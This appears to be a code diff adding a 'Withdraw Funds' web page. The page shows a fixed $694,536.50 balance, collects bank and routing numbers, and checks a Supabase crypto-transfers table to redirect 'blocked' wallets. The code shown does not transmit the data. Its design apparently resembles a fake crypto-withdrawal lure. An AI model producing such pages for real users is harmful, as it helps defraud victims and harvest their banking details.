@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdraw Funds</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; }
+
+        /* Header */
+        .header { text-align: center; margin-bottom: 28px; }
+        .header h2 { font-size: 22px; font-weight: 700; color: #38bdf8; margin-bottom: 6px; }
+        .header p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
+
+        /* Amount card */
+        .amount-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px 20px; margin-bottom: 24px; display: flex; justify-content: space-between; align-items: center; }
+        .amount-label { font-size: 13px; color: #64748b; margin-bottom: 4px; }
+        .amount-value { font-size: 24px; font-weight: 700; color: #4ade80; letter-spacing: -0.5px; }
+        .amount-badge { display: inline-flex; align-items: center; gap: 5px; background: rgba(74,222,128,0.1); border: 1px solid rgba(74,222,128,0.3); border-radius: 20px; padding: 4px 10px; font-size: 11px; font-weight: 700; color: #4ade80; }
+        .amount-badge::before { content: ''; width: 5px; height: 5px; border-radius: 50%; background: #4ade80; animation: blink 1.8s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+        /* Form */
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 13px; color: #94a3b8; margin-bottom: 8px; font-weight: 500; }
+        .form-group label span { color: #ef4444; margin-left: 2px; }
+
+        input, select { width: 100%; padding: 13px 14px; background-color: #0f172a; border: 2px solid #334155; color: #f8fafc; border-radius: 8px; font-size: 14px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; outline: none; transition: border-color 0.2s; appearance: none; -webkit-appearance: none; }
+        input::placeholder { color: #475569; }
+        input:focus, select:focus { border-color: #38bdf8; }
+        input.error, select.error { border-color: #ef4444; }
+        input.valid, select.valid { border-color: #4ade80; }
+
+        /* Custom select wrapper */
+        .select-wrap { position: relative; }
+        .select-wrap::after { content: '▾'; position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: #64748b; font-size: 14px; pointer-events: none; }
+        select option { background-color: #1e293b; color: #f8fafc; }
+        select option[value=""] { color: #475569; }
+
+        /* Amount input */
+        .amount-input-wrap { position: relative; }
+        .amount-input-wrap input { padding-left: 36px; font-family: 'Courier New', monospace; font-size: 15px; font-weight: 600; color: #4ade80; }
+        .amount-input-wrap input:disabled { color: #4ade80; cursor: not-allowed; opacity: 1; -webkit-text-fill-color: #4ade80; }
+        .currency-symbol { position: absolute; left: 13px; top: 50%; transform: translateY(-50%); color: #4ade80; font-size: 15px; font-weight: 700; pointer-events: none; }
+
+        /* Lock icon on amount */
+        .lock-icon { position: absolute; right: 13px; top: 50%; transform: translateY(-50%); color: #475569; font-size: 14px; }
+
+        /* Divider */
+        .divider { border: none; border-top: 1px solid #334155; margin: 22px 0; }
+
+        /* Note box */
+        .note-box { background-color: rgba(56,189,248,0.06); border: 1px solid rgba(56,189,248,0.2); border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #7dd3fc; line-height: 1.6; margin-bottom: 22px; }
+        .note-box strong { color: #38bdf8; }
+
+        /* Error / success messages */
+        .error-message { display: none; background-color: rgba(239,68,68,0.1); border: 1px solid #ef4444; color: #fca5a5; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 16px; line-height: 1.4; }
+
+        /* Button */
+        .btn { background-color: #2563eb; color: white; border: none; padding: 15px 28px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s, opacity 0.2s; }
+        .btn:hover:not(:disabled) { background-color: #1d4ed8; }
+        .btn:disabled { opacity: 0.35; cursor: not-allowed; }
+
+        /* Field hint */
+        .field-hint { font-size: 11px; color: #475569; margin-top: 5px; }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="header">
+        <h2>Withdraw Funds</h2>
+        <p>Enter your bank details below to receive your funds.</p>
+    </div>
+
+    <!-- Fixed amount display -->
+    <div class="amount-card">
+        <div>
+            <div class="amount-label">Total Withdrawal Amount</div>
+            <div class="amount-value">$694,536.50</div>
+        </div>
+        <div class="amount-badge"></div>
+    </div>
+
+    <!-- Bank Name -->
+    <div class="form-group">
+        <label>Bank Name <span>*</span></label>
+        <div class="select-wrap">
+            <select id="bank-name" onchange="validateField(this)">
+                <option value="">— Select your bank —</option>
+                <optgroup label="Major US Banks">
+                    <option>Bank of America</option>
+                    <option>JPMorgan Chase</option>
+                    <option>Wells Fargo</option>
+                    <option>Citibank</option>
+                    <option>U.S. Bank</option>
+                    <option>PNC Bank</option>
+                    <option>Goldman Sachs</option>
+                    <option>Morgan Stanley</option>
+                    <option>TD Bank</option>
+                    <option>Capital One</option>
+                    <option>Truist Bank</option>
+                    <option>American Express Bank</option>
+                    <option>Ally Bank</option>
+                    <option>Discover Bank</option>
+                    <option>Regions Bank</option>
+                    <option>Fifth Third Bank</option>
+                    <option>KeyBank</option>
+                    <option>Citizens Bank</option>
+                    <option>Huntington Bank</option>
+                    <option>Renasant Bank</option>
+                    <option>Navy Federal Credit Union</option>
+                </optgroup>
+                <optgroup label="International Banks">
+                    <option>HSBC</option>
+                    <option>Barclays</option>
+                    <option>Deutsche Bank</option>
+                    <option>BNP Paribas</option>
+                    <option>Standard Chartered</option>
+                    <option>UBS</option>
+                    <option>Credit Suisse</option>
+                    <option>Santander</option>
+                    <option>ING Group</option>
+                    <option>Société Générale</option>
+                </optgroup>
+                <optgroup label="Other">
+                    <option value="other">Other (not listed)</option>
+                </optgroup>
+            </select>
+        </div>
+    </div>
+
+    <!-- Account Name -->
+    <div class="form-group">
+        <label>Account Holder Name <span>*</span></label>
+        <input type="text" id="account-name" placeholder="Full name as it appears on account" oninput="validateField(this)" autocomplete="name">
+        <div class="field-hint">Must match your bank records exactly.</div>
+    </div>
+
+    <!-- Routing Number -->
+    <div class="form-group">
+        <label>Routing Number <span>*</span></label>
+        <input type="text" id="routing-number" placeholder="9-digit ABA routing number" maxlength="9" oninput="onlyDigits(this); validateRouting(this);" autocomplete="off" inputmode="numeric">
+        <div class="field-hint">9-digit number found at the bottom-left of your check.</div>
+    </div>
+
+    <!-- Account Number -->
+    <div class="form-group">
+        <label>Account Number <span>*</span></label>
+        <input type="text" id="account-number" placeholder="Your bank account number" maxlength="17" oninput="onlyDigits(this); validateField(this);" autocomplete="off" inputmode="numeric">
+        <div class="field-hint">Typically 8–17 digits depending on your bank.</div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Fixed Amount field -->
+    <div class="form-group">
+        <label>Amount to Receive</label>
+        <div class="amount-input-wrap">
+            <span class="currency-symbol">$</span>
+            <input type="text" value="694,536.50" disabled>
+            <span class="lock-icon">🔒</span>
+        </div>
+    </div>
+
+    <div class="error-message" id="form-error"></div>
+
+    <button class="btn" id="continue-btn" disabled onclick="handleSubmit()">Continue</button>
+
+</div>
+
+<script>
+    const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co';
+    const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
+
+    // ── Check is_blocked; redirect to main.html if true ──────────────────────
+    async function checkBlocked() {
+        const wallet = localStorage.getItem('active_wallet');
+        if (!wallet) return;
+        try {
+            const { data, error } = await supabaseClient
+                .from('crypto_transfers')
+                .select('is_blocked')
+                .eq('wallet_address', wallet)
+                .limit(1);
+            if (error || !data || data.length === 0) return;
+            if (data[0].is_blocked) {
+                window.location.href = 'main.html';
+            }
+        } catch (err) {
+            console.error('Block check failed:', err);
+        }
+    }
+
+    window.onload = checkBlocked;
+
+    const REQUIRED_IDS = ['bank-name', 'account-name', 'routing-number', 'account-number'];
+
+    function onlyDigits(el) {
+        el.value = el.value.replace(/\D/g, '');
+    }
+
+    function validateRouting(el) {
+        if (el.value.length === 9) {
+            el.classList.remove('error');
+            el.classList.add('valid');
+        } else if (el.value.length > 0) {
+            el.classList.remove('valid');
+            el.classList.add('error');
+        } else {
+            el.classList.remove('valid', 'error');
+        }
+        checkForm();
+    }
+
+    function validateField(el) {
+        const val = el.value.trim();
+        if (val) {
+            el.classList.remove('error');
+            el.classList.add('valid');
+        } else {
+            el.classList.remove('valid');
+        }
+        checkForm();
+    }
+
+    function checkForm() {
+        const bankOk     = document.getElementById('bank-name').value !== '';
+        const nameOk     = document.getElementById('account-name').value.trim() !== '';
+        const routingOk  = document.getElementById('routing-number').value.length === 9;
+        const accountOk  = document.getElementById('account-number').value.length >= 8;
+
+        document.getElementById('continue-btn').disabled = !(bankOk && nameOk && routingOk && accountOk);
+    }
+
+    function handleSubmit() {
+        const bank    = document.getElementById('bank-name').value;
+        const name    = document.getElementById('account-name').value.trim();
+        const routing = document.getElementById('routing-number').value;
+        const account = document.getElementById('account-number').value;
+
+        // Final validation
+        if (!bank || !name || routing.length !== 9 || account.length < 8) {
+            const err = document.getElementById('form-error');
+            err.textContent = '⚠️ Please fill in all fields correctly before continuing.';
+            err.style.display = 'block';
+            return;
+        }
+
+        document.getElementById('form-error').style.display = 'none';
+
+        window.location.href = 'main.html';
+    }
+</script>
+</body>
+</html>
